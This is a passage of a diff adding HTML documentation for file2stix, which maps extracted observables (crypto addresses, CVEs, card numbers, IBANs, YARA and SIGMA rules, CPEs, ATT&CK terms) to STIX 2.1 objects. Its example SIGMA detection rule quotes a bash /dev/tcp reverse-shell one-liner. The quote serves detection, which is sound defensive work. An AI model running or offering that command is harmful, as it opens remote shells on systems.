+    &quot;id&quot;: &quot;autonomous-system--&lt;GENERATED BY STIX2 LIBRARY&gt;&quot;,
+    &quot;number&quot;: &quot;&lt;EXTRACTED NUMERICAL AS OBSERVABLE VALUE&gt;&quot;
+}
+</code></pre>
+<h2 id="13-cryptocurrency-observables-indicator">13. Cryptocurrency Observables (<code>indicator</code>)<a class="headerlink" href="#13-cryptocurrency-observables-indicator" title="Permanent link">&para;</a></h2>
+<p>Including:</p>
+<ul>
+<li>e.g. BTC transaction <code>3FZbgi29cpjq2GjdwV8eyHuJJnkLtktZc5</code></li>
+<li>e.g. ETH transaction <code>0xb794f5ea0ba39494ce839613fffba74279579268</code></li>
+<li>e.g. XMR transaction <code>888tNkZrPN6JsEgekjMnABU4TBzc2Dt29EPAvkRxbANsAnjyPbb3iQ1YBRk1UXcdRsiKc9dhw</code></li>
+</ul>
+<p>Each of these address formats has a defined length and allowed characters that can be extracted using a regex pattern. For example, <a href="https://github.com/kvesteri/validators/blob/master/validators/btc_address.py">Bitcoin addresses is 58 characters</a>.</p>
+<p>Cryptocurrency Observables are represented by <a href="https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070633">STIX Indicator SDOs (<code>"type": "indicator"</code>)</a>/</p>
+<p>Here is how cryptocurrency observables are represented in STIX 2.1 by file2stix;</p>
+<h3 id="stix-21-extension-definition_1">STIX 2.1 extension-definition<a class="headerlink" href="#stix-21-extension-definition_1" title="Permanent link">&para;</a></h3>
+<p>As STIX 2.1 does not natively have an extension for cryptocurrency, file2stix uses a custom SCO;</p>
+<p>https://github.com/signalscorps/stix2-objects/blob/main/extension-definition/new-sco/cryptocurrency-transaction/extension-definition-bef728e0-53cb-11ed-bdc3-0242ac120002/20220101000000000.json</p>
+<h3 id="stix-21-cryptocurrency-transaaction-sco">STIX 2.1 cryptocurrency transaaction SCO<a class="headerlink" href="#stix-21-cryptocurrency-transaaction-sco" title="Permanent link">&para;</a></h3>
+<pre><code class="language-json">{
+    &quot;type&quot;: &quot;cryptocurrency-transaction&quot;,
+    &quot;spec_version&quot;: &quot;2.1&quot;,
+    &quot;id&quot;: &quot;cryptocurrency-transaction--&lt;GENERATED BY STIX2 LIBRARY&gt;&quot;,
+    &quot;currency_symbol&quot;: &quot;&lt;DETECTED CURRENCY TYPE&gt;&quot;,
+    &quot;address&quot;: &quot;&lt;EXTRACTED CRYPTOCURRENCY OBSERVABLE VALUE&gt;&quot;,
+    &quot;extensions&quot;: {
+        &quot;extension-definition--532ae28d-137b-4b89-afb7-9cf9b504191b&quot; : {
+            &quot;extension_type&quot; : &quot;new-sco&quot;
+        }
+    }
+}
+</code></pre>
+<h3 id="stix-21-indicator-sdo_14">STIX 2.1 indicator SDO<a class="headerlink" href="#stix-21-indicator-sdo_14" title="Permanent link">&para;</a></h3>
+<pre><code class="language-json">  {
+    &quot;type&quot;: &quot;indicator&quot;,
+    &quot;spec_version&quot;: &quot;2.1&quot;,
+    &quot;id&quot;: &quot;indicator--&lt;GENERATED BY STIX2 LIBRARY&gt;&quot;,
+    &quot;created_by_ref&quot;: &quot;identity--&lt;IF TLP RED/AMBER/GREEN USER IDENTITY ID&gt;&quot;,
+    &quot;created&quot;: &quot;&lt;REPORT CREATED PROPERTY VALUE&gt;&quot;,
+    &quot;modified&quot;: &quot;&lt;REPORT MODIFIED PROPERTY VALUE&gt;&quot;,
+    &quot;indicator_types&quot;: [
+        &quot;unknown&quot;,
+        &quot;&lt;IF MATCHES WARNING LIST BENIGN&gt;&quot;
+    ],
+    &quot;confidence&quot;: &quot;&lt;CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN&gt;&quot;,
+    &quot;name&quot;: &quot;&lt;CRYPTO TYPE&gt; Transaction: &lt;EXTRACTED CRYPTOCURRENCY OBSERVABLE VALUE&gt;&quot;,
+    &quot;pattern_type&quot;: &quot;stix&quot;,
+    &quot;pattern&quot;: &quot;[ cryptocurrency-transaction:address = '&lt;EXTRACTED CRYPTOCURRENCY OBSERVABLE VALUE&gt;' ]&quot;,
+    &quot;valid_from&quot;: &quot;&lt;REPORT CREATED PROPERTY VALUE&gt;&quot;,
+    &quot;object_marking_refs&quot;: [
+        &quot;marking-definition--&lt;TLP LEVEL SET&gt;&quot;
+    ]
+}
+</code></pre>
+<h2 id="14-cve-observables-vulnerability">14. CVE Observables (<code>vulnerability</code>)<a class="headerlink" href="#14-cve-observables-vulnerability" title="Permanent link">&para;</a></h2>
+<ul>
+<li>e.g. Full CVE IDs <code>CVE-2022-00001</code></li>
+</ul>
+<p>CVE's always follow the format <code>CVE-YYYY-DDDDD</code>, where <code>YYYY</code> is the year and <code>DDDDD</code> is the numeric ID of the CVE.</p>
+<p>CVE Observables are represented by the <a href="https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070669">STIX Vulnerability SDOs (<code>"type": "vulnerability"</code>)</a>.</p>
+<p>Here is how CVE observables are represented in STIX 2.1 by file2stix;</p>
+<h3 id="stix-21-vulnerability-extension-definition">STIX 2.1 vulnerability extension-definition<a class="headerlink" href="#stix-21-vulnerability-extension-definition" title="Permanent link">&para;</a></h3>
+<p>https://raw.githubusercontent.com/signalscorps/stix2-objects/main/extension-definition/property-extension/nvd-cve-extension/extension-definition--b2b5f2cd-49e6-4091-a0e0-c0bb71543e23/20220101000000000.json</p>
+<h3 id="stix-21-vulnerability-sdo">STIX 2.1 vulnerability SDO<a class="headerlink" href="#stix-21-vulnerability-sdo" title="Permanent link">&para;</a></h3>
+<p>Imported from <a href="https://github.com/signalscorps/cve2stix-output">cvestix-output database</a> using cve ids -- includes relationships.</p>
+<h3 id="stix-21-indictor-extension-definition">STIX 2.1 indictor extension-definition<a class="headerlink" href="#stix-21-indictor-extension-definition" title="Permanent link">&para;</a></h3>
+<p>https://raw.githubusercontent.com/signalscorps/stix2-objects/main/schemas/property-extension/cve2stix-enrichment-extension/example.json</p>
+<h3 id="stix-21-indicator-sdo_15">STIX 2.1 indicator SDO<a class="headerlink" href="#stix-21-indicator-sdo_15" title="Permanent link">&para;</a></h3>
+<p>Imported from <a href="https://github.com/signalscorps/cve2stix-output">cvestix-output database</a> using cve ids -- includes relationships.</p>
+<h2 id="15-country-observables-location">15. Country Observables (<code>location</code>)<a class="headerlink" href="#15-country-observables-location" title="Permanent link">&para;</a></h2>
+<p>Including:</p>
+<ul>
+<li>Country Name (e.g. <code>United Kingdom</code>)</li>
+<li>Country Code (e.g. <code>UK</code>)</li>
+</ul>
+<p>English country names and codes can be identified by standard definition dictionaries, <a href="https://github.com/cmu-sei/cyobstract/blob/master/etc/country_codes.txt">for example</a>.</p>
+<p>Countries are represented by the <a href="https://docs.oasis-open.org/cti/stix/v2.1/cs01/stix-v2.1-cs01.html#_th8nitr8jb4k">STIX Location SDOs (<code>"type": "location"</code>)</a>.</p>
+<p>Here is how Country observables are represented in STIX 2.1 by file2stix;</p>
+<h3 id="stix-21-location-sdo">STIX 2.1 location SDO<a class="headerlink" href="#stix-21-location-sdo" title="Permanent link">&para;</a></h3>
+<pre><code class="language-json">{
+    &quot;type&quot;: &quot;location&quot;,
+    &quot;spec_version&quot;: &quot;2.1&quot;,
+    &quot;id&quot;: &quot;location--&lt;GENERATED BY STIX2 LIBRARY&gt;&quot;,
+    &quot;created_by_ref&quot;: &quot;identity--&lt;IF TLP RED/AMBER/GREEN USER IDENTITY ID&gt;&quot;,
+    &quot;created&quot;: &quot;&lt;REPORT CREATED PROPERTY VALUE&gt;&quot;,
+    &quot;modified&quot;: &quot;&lt;REPORT MODIFIED PROPERTY VALUE&gt;&quot;,
+    &quot;name&quot;: &quot;Country: &lt;EXTRACTED / CONVERTED FULL COUNTRY NAME OBSERVABLE VALUE&gt;&quot;,
+    &quot;country&quot;: &quot;&lt;EXTRACTED / CONVERTED COUNTRY ISO OBSERVABLE VALUE&gt;&quot;,
+    &quot;object_marking_refs&quot;: [
+        &quot;marking-definition--&lt;TLP LEVEL SET&gt;&quot;
+    ]
+}
+</code></pre>
+<p>Note, in the case of Country Name extractions, the country name needs to be converted to a two character ISO 3166-1 ALPHA-2 Code for the <code>country</code> property.</p>
+<h2 id="16-credit-card-observables-indicator">16. Credit Card Observables (<code>indicator</code>)<a class="headerlink" href="#16-credit-card-observables-indicator" title="Permanent link">&para;</a></h2>
+<ul>
+<li>e.g. Mastercard <code>5555555555554444</code></li>
+<li>e.g. Visa <code>4242424242424242</code></li>
+<li>e.g. AMEX <code>378282246310005</code></li>
+<li>e.g. Union Pay <code>6200000000000005</code></li>
+<li>e.g. Diners <code>3056930009020004</code></li>
+<li>e.g. JCB <code>3566002020360505</code></li>
+<li>e.g. Discover <code>6011111111111117</code></li>
+</ul>
+<p>Card Numbers are always 16 digits long and the type of card can be determined by the first four digits (e.g. <code>4242</code> for Visa). <a href="https://github.com/kvesteri/validators/blob/master/validators/validators/card.py">Therefore it is easy to identify card numbers using regular expressions</a>.</p>
+<p>These are represented by <a href="https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070633">STIX Indicator SDOs (<code>"type": "indicator"</code>)</a>.</p>
+<p>Here is how credit card observables are represented in STIX 2.1 by file2stix;</p>
+<h3 id="stix-21-extension-definition_2">STIX 2.1 extension-definition<a class="headerlink" href="#stix-21-extension-definition_2" title="Permanent link">&para;</a></h3>
+<p>As STIX 2.1 does not natively have an extension for credit cards, file2stix uses a custom SCO;</p>
+<p>https://raw.githubusercontent.com/signalscorps/stix2-objects/main/extension-definition/new-sco/credit-card/extension-definition--abd6fc0e-749e-4e6c-a20c-1faa419f5ee4/20220101000000000.json</p>
+<h3 id="stix-21-credit-card-sco">STIX 2.1 credit-card SCO<a class="headerlink" href="#stix-21-credit-card-sco" title="Permanent link">&para;</a></h3>
+<pre><code class="language-json">{
+    &quot;type&quot;: &quot;credit-card&quot;,
+    &quot;spec_version&quot;: &quot;2.1&quot;,
+    &quot;id&quot;: &quot;credit-card--&lt;GENERATED BY STIX2 LIBRARY&gt;&quot;,
+    &quot;issuer&quot;: &quot;&lt;CREDIT CARD TYPE&gt;&quot;,
+    &quot;number&quot;: &quot;&lt;CREDIT CARD NUMBER&gt;&quot;,
+    &quot;extensions&quot;: {
+        &quot;extension-definition--abd6fc0e-749e-4e6c-a20c-1faa419f5ee4&quot; : {
+            &quot;extension_type&quot; : &quot;new-sco&quot;
+        }
+    }
+}
+</code></pre>
+<h3 id="stix-21-indicator-sdo_16">STIX 2.1 indicator SDO<a class="headerlink" href="#stix-21-indicator-sdo_16" title="Permanent link">&para;</a></h3>
+<pre><code class="language-json">{
+    &quot;type&quot;: &quot;indicator&quot;,
+    &quot;spec_version&quot;: &quot;2.1&quot;,
+    &quot;id&quot;: &quot;indicator--&lt;GENERATED BY STIX2 LIBRARY&gt;&quot;,
+    &quot;created_by_ref&quot;: &quot;identity--&lt;IF TLP RED/AMBER/GREEN USER IDENTITY ID&gt;&quot;,
+    &quot;created&quot;: &quot;&lt;REPORT CREATED PROPERTY VALUE&gt;&quot;,
+    &quot;modified&quot;: &quot;&lt;REPORT MODIFIED PROPERTY VALUE&gt;&quot;,
+    &quot;indicator_types&quot;: [
+        &quot;unknown&quot;,
+        &quot;&lt;IF MATCHES WARNING LIST BENIGN&gt;&quot;
+    ],
+    &quot;confidence&quot;: &quot;&lt;CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN&gt;&quot;,
+    &quot;name&quot;: &quot;&lt;CARD TYPE&gt; Credit Card: &lt;EXTRACTED CREDIT CARD OBSERVABLE VALUE&gt;&quot;,
+    &quot;pattern_type&quot;: &quot;stix&quot;,
+    &quot;pattern&quot;: &quot;[  credit-card:number = '&lt;EXTRACTED CREDIT CARD OBSERVABLE VALUE&gt;' ]&quot;,
+    &quot;valid_from&quot;: &quot;&lt;REPORT CREATED PROPERTY VALUE&gt;&quot;,
+    &quot;object_marking_refs&quot;: [
+        &quot;marking-definition--&lt;TLP LEVEL SET&gt;&quot;
+    ]
+}
+</code></pre>
+<h2 id="17-bank-account-observables-indicator">17. Bank Account Observables (<code>indicator</code>)<a class="headerlink" href="#17-bank-account-observables-indicator" title="Permanent link">&para;</a></h2>
+<p>In the case of file2stix bank accounts are identified using IBAN numbers.
+* e.g. German IBAN <code>DE29100500001061045672</code>
+* e.g. Great Britain IBAN <code>GB94BARC10201530093459</code></p>
+<p>IBAN numbers start with the country code. The country determines the length of the IBAN number and the structure (they are not all the same). However, as each countries structure must follow the same format <a href="https://github.com/kvesteri/validators/blob/master/validators/iban.py">a regular expression can be used to match all IBAN country variations</a>.</p>
+<p>IBANs are represented by <a href="https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070633">STIX Indicator SDOs (<code>"type": "indicator"</code>)</a>.</p>
+<p>Here is how IBAN number observables are represented in STIX 2.1 by file2stix;</p>
+<h3 id="stix-21-extension-definition_3">STIX 2.1 extension-definition<a class="headerlink" href="#stix-21-extension-definition_3" title="Permanent link">&para;</a></h3>
+<p>As STIX 2.1 does not natively have an extension for IBANs, file2stix uses a custom SCO;</p>
+<p>https://raw.githubusercontent.com/signalscorps/stix2-objects/main/extension-definition/new-sco/bank-account/extension-definition--349c1029-4052-4635-a064-263cb17290ea/20220101000000000.json</p>
+<h3 id="stix-21-bank-account-sco">STIX 2.1 bank-account SCO<a class="headerlink" href="#stix-21-bank-account-sco" title="Permanent link">&para;</a></h3>
+<pre><code class="language-json">{
+    &quot;type&quot;: &quot;bank-account&quot;,
+    &quot;spec_version&quot;: &quot;2.1&quot;,
+    &quot;id&quot;: &quot;bank-account--&lt;GENERATED BY STIX2 LIBRARY&gt;&quot;,
+    &quot;iban_number&quot;: &quot;&lt;FULL IBAN NUMBER INCLUDING COUNTRY CODE&gt;&quot;,
+    &quot;extensions&quot;: {
+        &quot;extension-definition--349c1029-4052-4635-a064-263cb17290ea&quot;: {
+            &quot;extension_type&quot; : &quot;new-sco&quot;
+        }
+    }
+}
+</code></pre>
+<h3 id="stix-21-indicator-sdo_17">STIX 2.1 indicator SDO<a class="headerlink" href="#stix-21-indicator-sdo_17" title="Permanent link">&para;</a></h3>
+<pre><code class="language-json">{
+    &quot;type&quot;: &quot;indicator&quot;,
+    &quot;spec_version&quot;: &quot;2.1&quot;,
+    &quot;id&quot;: &quot;indicator--&lt;GENERATED BY STIX2 LIBRARY&gt;&quot;,
+    &quot;created_by_ref&quot;: &quot;identity--&lt;IF TLP RED/AMBER/GREEN USER IDENTITY ID&gt;&quot;,
+    &quot;created&quot;: &quot;&lt;REPORT CREATED PROPERTY VALUE&gt;&quot;,
+    &quot;modified&quot;: &quot;&lt;REPORT MODIFIED PROPERTY VALUE&gt;&quot;,
+    &quot;indicator_types&quot;: [
+        &quot;unknown&quot;,
+        &quot;&lt;IF MATCHES WARNING LIST BENIGN&gt;&quot;
+    ],
+    &quot;confidence&quot;: &quot;&lt;CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN&gt;&quot;,
+    &quot;name&quot;: &quot;Bank account: &lt;EXTRACTED IBAN OBSERVABLE VALUE&gt;&quot;,
+    &quot;pattern_type&quot;: &quot;stix&quot;,
+    &quot;pattern&quot;: &quot;[ bank-account:iban_number = '&lt;EXTRACTED IBAN OBSERVABLE VALUE&gt;' ]&quot;,
+    &quot;valid_from&quot;: &quot;&lt;REPORT CREATED PROPERTY VALUE&gt;&quot;,
+    &quot;object_marking_refs&quot;: [
+        &quot;marking-definition--&lt;TLP LEVEL SET&gt;&quot;
+    ]
+}
+</code></pre>
+<h2 id="18-yara-rule-observables-indicator">18. YARA Rule Observables (<code>indicator</code>)<a class="headerlink" href="#18-yara-rule-observables-indicator" title="Permanent link">&para;</a></h2>
+<p>e.g. </p>
+<pre><code class="language-yaml">rule dummy
+{
+    condition:
+        false
+}
+</code></pre>
+<p>YARA rules are can be identified using pattern matching as they always start with <code>rule</code> and end with <code>}</code>.</p>
+<p>YARA Rules are represented by <a href="https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070633">STIX Indicator SDOs (<code>"type": "indicator"</code>)</a> with <a href="https://docs.oasis-open.org/cti/stix/v2.1/os/stix-v2.1-os.html#_9lfdvxnyofxw"><code>"pattern_type": "yara"</code></a>.</p>
+<p>Here is how YARA Rule observables are represented in STIX 2.1 by file2stix;</p>
+<h3 id="stix-21-indicator-sdo_18">STIX 2.1 indicator SDO<a class="headerlink" href="#stix-21-indicator-sdo_18" title="Permanent link">&para;</a></h3>
+<pre><code class="language-json">{
+    &quot;type&quot;: &quot;indicator&quot;,
+    &quot;spec_version&quot;: &quot;2.1&quot;,
+    &quot;id&quot;: &quot;indicator--&lt;GENERATED BY STIX2 LIBRARY&gt;&quot;,
+    &quot;created_by_ref&quot;: &quot;identity--&lt;IF TLP RED/AMBER/GREEN USER IDENTITY ID&gt;&quot;,
+    &quot;created&quot;: &quot;&lt;REPORT CREATED PROPERTY VALUE&gt;&quot;,
+    &quot;modified&quot;: &quot;&lt;REPORT MODIFIED PROPERTY VALUE&gt;&quot;,
+    &quot;indicator_types&quot;: [
+        &quot;unknown&quot;,
+        &quot;&lt;IF MATCHES WARNING LIST BENIGN&gt;&quot;
+    ],
+    &quot;confidence&quot;: &quot;&lt;CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN&gt;&quot;,
+    &quot;name&quot;: &quot;YARA Rule: &lt;RULE NAME&gt;&quot;,
+    &quot;pattern_type&quot;: &quot;yara&quot;,
+    &quot;pattern&quot;: &quot;&lt;YARA RULE&gt;&quot;,
+    &quot;valid_from&quot;: &quot;&lt;REPORT CREATED PROPERTY VALUE&gt;&quot;,
+    &quot;object_marking_refs&quot;: [
+        &quot;marking-definition--&lt;TLP LEVEL SET&gt;&quot;
+    ]
+}
+</code></pre>
+<p>The YARA rule is first encoded with JSON escapes before it is saved in the <code>pattern</code> value. e.g.</p>
+<pre><code>rule dummy\r\n{\r\n    condition:\r\n        false\r\n}
+</code></pre>
+<p>The <code>&lt;RULE NAME&gt;</code> is defined between the text <code>rule</code> and first <code>{</code> (e.g. <code>dummy</code> in the last example).</p>
+<h2 id="19-sigma-rule-observables-indicator">19. SIGMA Rule Observables (<code>indicator</code>)<a class="headerlink" href="#19-sigma-rule-observables-indicator" title="Permanent link">&para;</a></h2>
+<p>e.g. </p>
+<pre><code class="language-yaml">title: Linux Reverse Shell Indicator
+id: 83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871
+status: experimental
+description: Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i &gt;&amp; /dev/tcp/10.0.0.1/4242 0&gt;&amp;1')
+date: 2021/10/16
+author: Florian Roth
+logsource:
+   product: linux
+   category: network_connection
+detection:
+   selection:
+      Image|endswith: '/bin/bash'
+   filter:
+      DestinationIp: 
+         - '127.0.0.1'
+         - '0.0.0.0'
+   condition: selection and not filter
+</code></pre>
+<p>SIGMA Rules are detected if valid YAML containing three top level fields <code>title</code>, <code>logsource</code> and <code>detection</code> is present. If the three field names are detected, entire YAML content is ingested as the SIGMA rule.</p>
+<p>SIGMA Rules are represented by <a href="https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070633">STIX Indicator SDOs (<code>"type": "indicator"</code>)</a> with <a href="https://docs.oasis-open.org/cti/stix/v2.1/os/stix-v2.1-os.html#_9lfdvxnyofxw"><code>"pattern_type": "sigma"</code></a>.</p>
+<p>Here is how SIGMA Rule observables are represented in STIX 2.1 by file2stix;</p>
+<h3 id="stix-21-extension-definition_4">STIX 2.1 extension-definition<a class="headerlink" href="#stix-21-extension-definition_4" title="Permanent link">&para;</a></h3>
+<p>https://github.com/signalscorps/stix2-objects/blob/main/extension-definition/property-extension/sigma-rule-extension/extension-definition--94f4bdb6-7f39-4d0a-b103-f787026963a6/20220101000000000.json</p>
+<h3 id="stix-21-indicator-sdo_19">STIX 2.1 indicator SDO<a class="headerlink" href="#stix-21-indicator-sdo_19" title="Permanent link">&para;</a></h3>
+<pre><code class="language-json">{
+    &quot;type&quot;: &quot;indicator&quot;,
+    &quot;spec_version&quot;: &quot;2.1&quot;,
+    &quot;id&quot;: &quot;indicator--&lt;GENERATED BY STIX2 LIBRARY&gt;&quot;,
+    &quot;created_by_ref&quot;: &quot;identity--&lt;IF TLP RED/AMBER/GREEN USER IDENTITY ID&gt;&quot;,
+    &quot;created&quot;: &quot;&lt;REPORT CREATED PROPERTY VALUE&gt;&quot;,
+    &quot;modified&quot;: &quot;&lt;REPORT MODIFIED PROPERTY VALUE&gt;&quot;,
+    &quot;indicator_types&quot;: [
+        &quot;unknown&quot;,
+        &quot;&lt;IF MATCHES WARNING LIST BENIGN&gt;&quot;
+    ],
+    &quot;confidence&quot;: &quot;&lt;CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN&gt;&quot;,
+    &quot;name&quot;: &quot;SIGMA Rule: &lt;SIGMA RULE TITLE&gt;&quot;,
+    &quot;pattern_type&quot;: &quot;sigma&quot;,
+    &quot;pattern&quot;: &quot;&lt;SIGMA RULE&gt;&quot;,
+    &quot;valid_from&quot;: &quot;&lt;REPORT CREATED PROPERTY VALUE&gt;&quot;,
+    &quot;object_marking_refs&quot;: [
+        &quot;marking-definition--&lt;TLP LEVEL SET&gt;&quot;
+    ],
+    &quot;external_references&quot;: [
+        {
+            &quot;source_name&quot;: &quot;Sigma Rule Reference&quot;,
+            &quot;url&quot;: &quot;&lt;SIGMA RULE REFERENCES[0]&gt;&quot;
+        }
+    ],
+    &quot;extensions&quot;: {
+        &quot;extension-definition--94f4bdb6-7f39-4d0a-b103-f787026963a6&quot;: {
+            &quot;extension_type&quot;: &quot;property-extension&quot;,
+            &quot;sigma_rule&quot;: {
+                &quot;title&quot;: &quot;&lt;SIGMA RULE TITLE&gt;&quot;,
+                &quot;id&quot;: &quot;&lt;SIGMA RULE ID&gt;&quot;,
+                &quot;date&quot;: &quot;&lt;SIGMA RULE DATE&gt;&quot;,
+                &quot;modified&quot;: &quot;&lt;SIGMA RULE MODIFIED&gt;&quot;,
+                &quot;related&quot;: [
+                    {
+                        &quot;id&quot;: &quot;&lt;SIGMA RULE RELATED.ID[0]&gt;&quot;,
+                        &quot;type&quot;: &quot;&lt;SIGMA RULE RELATED.TYPE[0]&gt;&quot;
+                    }
+                ],
+                &quot;status&quot;: &quot;&lt;SIGMA RULE STATUS&gt;&quot;,
+                &quot;description&quot;: &quot;&lt;SIGMA RULE DESCRIPTION&gt;&quot;,
+                &quot;license&quot;: &quot;&lt;SIGMA RULE LICENSE&gt;&quot;,
+                &quot;author&quot;: &quot;&lt;SIGMA RULE AUTHOR&gt;&quot;,
+                &quot;references&quot;: [
+                    &quot;&lt;SIGMA RULE REFERENCES[0]&gt;&quot;
+                ],
+                &quot;fields&quot;: [
+                    &quot;&lt;SIGMA RULE FIELDS[0]&gt;&quot;
+                ],
+                &quot;falsepositives&quot;: [
+                    &quot;&lt;SIGMA RULE FALSEPOSITIVES[0]&gt;&quot;
+                ],
+                &quot;level&quot;: &quot;&lt;SIGMA RULE LEVEL&gt;&quot;,
+                &quot;tags&quot;: [
+                    &quot;&lt;SIGMA RULE TAGS[0]&gt;&quot;
+                ],
+                &quot;logsource&quot;: {
+                    &quot;category&quot;: &quot;&lt;SIGMA RULE LOGSOURCE.CATEGORY&gt;&quot;,
+                    &quot;product&quot;: &quot;&lt;SIGMA RULE LOGSOURCE.PRODUCT&gt;&quot;,
+                    &quot;service&quot;: &quot;&lt;SIGMA RULE LOGSOURCE.SERVICE&gt;&quot;,
+                    &quot;definition&quot;: &quot;&lt;SIGMA RULE LOGSOURCE.DEFINITION&gt;&quot;
+                },
+                &quot;detection&quot;: [
+                    &quot;&lt;SIGMA RULE DETECTION[0]&gt;&quot;
+                ]
+            }
+        }
+    }
+}
+</code></pre>
+<p>The SIGMA RULE is encoded with JSON escapes before being written into the <code>pattern</code> value. e.g.</p>
+<pre><code>title: Linux Reverse Shell Indicator\r\nid: 83dcd9f6-9ca8-4af7-a16e-a1c7a6b51871\r\nstatus: experimental\r\ndescription: Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i &gt;&amp; \/dev\/tcp\/10.0.0.1\/4242 0&gt;&amp;1')\r\ndate: 2021\/10\/16\r\nauthor: Florian Roth\r\nlogsource:\r\n   product: linux\r\n   category: network_connection\r\ndetection:\r\n   selection:\r\n      Image|endswith: '\/bin\/bash'\r\n   filter:\r\n      DestinationIp: \r\n         - '127.0.0.1'\r\n         - '0.0.0.0'\r\n   condition: selection and not filter
+
+</code></pre>
+<p>The <code>&lt;RULE NAME&gt;</code> is defined by the value in the <code>title:</code> field of the YAML rule.</p>
+<h2 id="20-cpe-observables-software">20. CPE Observables (<code>software</code>)<a class="headerlink" href="#20-cpe-observables-software" title="Permanent link">&para;</a></h2>
+<ul>
+<li>e.g. Full CPE URI <code>cpe:2.3:o:apple:mac_os_x:10.1.3:*:*:*:*:*:*:*</code></li>
+</ul>
+<p>CPEs can be identified as they start with <code>cpe:</code> and have 12 separators <code>:</code> in total.</p>
+<p>CPEs are represented by <a href="https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070740">STIX Software SCOs (<code>"type": "software"</code>)</a></p>
+<h3 id="stix-21-indicator-sdo_20">STIX 2.1 Indicator SDO<a class="headerlink" href="#stix-21-indicator-sdo_20" title="Permanent link">&para;</a></h3>
+<pre><code class="language-json">{
+    &quot;type&quot;: &quot;indicator&quot;,
+    &quot;spec_version&quot;: &quot;2.1&quot;,
+    &quot;id&quot;: &quot;indicator--&lt;GENERATED BY STIX2 LIBRARY&gt;&quot;,
+    &quot;created_by_ref&quot;: &quot;identity--&lt;IF TLP RED/AMBER/GREEN USER IDENTITY ID&gt;&quot;,
+    &quot;created&quot;: &quot;&lt;REPORT CREATED PROPERTY VALUE&gt;&quot;,
+    &quot;modified&quot;: &quot;&lt;REPORT MODIFIED PROPERTY VALUE&gt;&quot;,
+    &quot;indicator_types&quot;: [
+        &quot;unknown&quot;,
+        &quot;&lt;IF MATCHES WARNING LIST BENIGN&gt;&quot;
+    ],
+    &quot;confidence&quot;: &quot;&lt;CONFIDENCE SCORE IF SET AND TLP RED/AMBER/GREEN&gt;&quot;,
+    &quot;name&quot;: &quot;CPE: &lt;EXTRACTED CPE URI&gt;&quot;,
+    &quot;pattern_type&quot;: &quot;stix&quot;,
+    &quot;pattern&quot;: &quot;[ software:cpe = '&lt;EXTRACTED CPE URI&gt;' ]&quot;,
+    &quot;valid_from&quot;: &quot;&lt;REPORT CREATED PROPERTY VALUE&gt;&quot;,
+    &quot;object_marking_refs&quot;: [
+        &quot;marking-definition--&lt;TLP LEVEL SET&gt;&quot;
+    ]
+}
+</code></pre>
+<h3 id="stix-21-software-sco">STIX 2.1 software SCO<a class="headerlink" href="#stix-21-software-sco" title="Permanent link">&para;</a></h3>
+<p>Imported from <a href="https://github.com/signalscorps/cve2stix-output">cvestix-output database</a> using cpe uris -- includes relationships.</p>
+<h2 id="21-mitre-attck-observables">21. MITRE ATT&amp;CK Observables<a class="headerlink" href="#21-mitre-attck-observables" title="Permanent link">&para;</a></h2>
+<p><a href="/blog/2022/2022-04-18-mitre-attack-101-data-structure.md">I have created an extensive MITRE ATT&amp;CK tutorial I recommend reading if you are new to the framework</a>.</p>
+<p>file2stix is designed to identify ATT&amp;CK data found in text using keyword matches on the <code>name</code>, <code>external_references.external_id</code> (where <code>"source_name": "mitre-attack"</code> for Enterprise ATT&amp;CK or <code>"source_name": "mitre-mobile-attack"</code> for mobile ATT&amp;CK) and <code>x_mitre_aliases</code> (when exists) fields inside the STIX object representing it.</p>
+<p>Take the ATT&amp;CK sub-technique <a href="https://github.com/mitre/cti/blob/master/enterprise-attack/attack-pattern/attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9.json">1053.005: Scheduled Task</a>.</p>
+<p>You will see;</p>
+<pre><code class="language-json">    &quot;name&quot;: &quot;Scheduled Task&quot;,
+</code></pre>
+<p>and</p>
+<pre><code class="language-json">{
+    &quot;source_name&quot;: &quot;mitre-attack&quot;,
+    &quot;external_id&quot;: &quot;T1053.005&quot;,
+    &quot;url&quot;: &quot;https://attack.mitre.org/techniques/T1053/005&quot;
+},
+</code></pre>
+<p>Therefore, the dictionary entries to identify this ATT&amp;CK Object are <code>Scheduled Task</code> and <code>T1053.005</code> (case insensitive).</p>
+<p>The following ATT&amp;CK data types from the <a href="https://github.com/mitre/cti/tree/master/enterprise-attack">Enterprise</a> and <a href="https://github.com/mitre/cti/tree/master/mobile-attack">Mobile</a> and <a href="https://github.com/mitre/cti/tree/master/ics-attack">ICS</a> matrices are supported in this way;</p>
+<ul>
+<li>Techniques (<code>attack-pattern</code>)</li>
+<li>Sub-Technique (<code>attack-pattern</code>)</li>
+<li>Tactic (<code>x-mitre-tactic--</code>)</li>
+<li>Course of Action (<code>course-of-action</code>)</li>
+<li>Intrusion Set (<code>intrusion-set</code>)</li>
+<li>Malware (<code>malware</code>)</li>
+<li>Tool (<code>tool</code>)</li>
+<li>Data Sources (<code>x-mitre-data-source</code>)</li>
+</ul>
+<p>In the case of a dictionary match to a MITRE ATT&amp;CK STIX Object, no new object is actually created. A new Relationship Object is created between the created STIX Report SDO with imported ATT&amp;CK STIX Object. The ATT&amp;CK STIX Object remains unmodified.</p>
